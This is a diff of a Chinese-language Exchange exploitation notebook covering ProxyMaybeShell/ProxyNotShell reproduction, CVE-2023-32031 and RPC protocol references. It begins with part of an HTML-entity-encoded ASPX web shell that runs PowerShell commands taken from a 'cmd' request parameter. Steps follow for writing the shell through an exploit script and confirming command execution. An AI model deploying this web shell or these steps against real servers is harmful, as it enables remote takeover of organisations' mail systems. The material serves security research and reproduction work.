20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x42;&#x75;&#x69;&#x6c;&#x64;&#x65;&#x72;&#x2e;&#x41;&#x70;&#x70;&#x65;&#x6e;&#x64;&#x4c;&#x69;&#x6e;&#x65;&#x28;&#x6f;&#x62;&#x6a;&#x2e;&#x54;&#x6f;&#x53;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x29;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x72;&#x65;&#x74;&#x75;&#x72;&#x6e;&#x20;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x42;&#x75;&#x69;&#x6c;&#x64;&#x65;&#x72;&#x2e;&#x54;&#x6f;&#x53;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x63;&#x61;&#x74;&#x63;&#x68;&#x28;&#x45;&#x78;&#x63;&#x65;&#x70;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x65;&#x78;&#x63;&#x65;&#x70;&#x74;&#x69;&#x6f;&#x6e;&#x29;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x72;&#x65;&#x74;&#x75;&#x72;&#x6e;&#x20;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x2e;&#x46;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x28;&#x22;&#x45;&#x72;&#x72;&#x6f;&#x72;&#x3a;&#x20;&#x7b;&#x30;&#x7d;&#x22;&#x2c;&#x20;&#x65;&#x78;&#x63;&#x65;&#x70;&#x74;&#x69;&#x6f;&#x6e;&#x2e;&#x4d;&#x65;&#x73;&#x73;&#x61;&#x67;&#x65;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x70;&#x72;&#x6f;&#x74;&#x65;&#x63;&#x74;&#x65;&#x64;&#x20;&#x76;&#x6f;&#x69;&#x64;&#x20;&#x50;&#x61;&#x67;&#x65;&#x5f;&#x4c;&#x6f;&#x61;&#x64;&#x28;&#x6f;&#x62;&#x6a;&#x65;&#x63;&#x74;&#x20;&#x73;&#x65;&#x6e;&#x64;&#x65;&#x72;&#x2c;&#x20;&#x45;&#x76;&#x65;&#x6e;&#x74;&#x41;&#x72;&#x67;&#x73;&#x20;&#x65;&#x29;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x52;&#x65;&#x73;&#x70;&#x6f;&#x6e;&#x73;&#x65;&#x2e;&#x57;&#x72;&#x69;&#x74;&#x65;&#x28;&#x70;&#x6f;&#x77;&#x65;&#x72;&#x73;&#x68;&#x65;&#x6c;&#x6c;&#x65;&#x64;&#x28;&#x52;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x2e;&#x50;&#x61;&#x72;&#x61;&#x6d;&#x73;&#x5b;&#x22;&#x63;&#x6d;&#x64;&#x22;&#x5d;&#x29;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;
 ```
 
-- ![](./pics/proxymaybeshell1.png)
+![](./pics/proxymaybeshell1.png)
 
 然后将编码后的数据放入[proxynotshellfileWrite.py](./proxymaybeshell/ProxyMaybeShell-main/proxynotshellfileWrite.py)脚本中如下：
 
-- ![](./pics/proxymaybeshell2.png)
+![](./pics/proxymaybeshell2.png)
 
 运行shell写入脚本
 
@@ -2356,9 +2356,9 @@ root@fdvoid0:/mnt/d/1.recent-research/exchange/proxy-attackchain/proxymaybeshell
 
 可以执行部分powershell命令，至此proxymaybeshell复现暂时告一段落
 
-- ![](./pics/proxymaybeshell3.png)
+![](./pics/proxymaybeshell3.png)
 
-- ![](./pics/proxymaybeshell4.png)
+![](./pics/proxymaybeshell4.png)
 
 # CVE-2023-32031
 
@@ -2398,7 +2398,7 @@ https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/
 # Low Level API (RPC)
 
 - [All protocols](./exchange-protocols/)
-- ![](./pics/protocols.png)
+![](./pics/protocols.png)
 - [A tool to abuse Exchange services](https://github.com/sensepost/ruler)
 - [Attacking MS Exchange Web Interfaces](https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/)
 - [Exchange Server Protocol Documents](https://learn.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxprotlp/30c90a39-9adf-472b-8b5b-03c282304a83?source=recommendations)
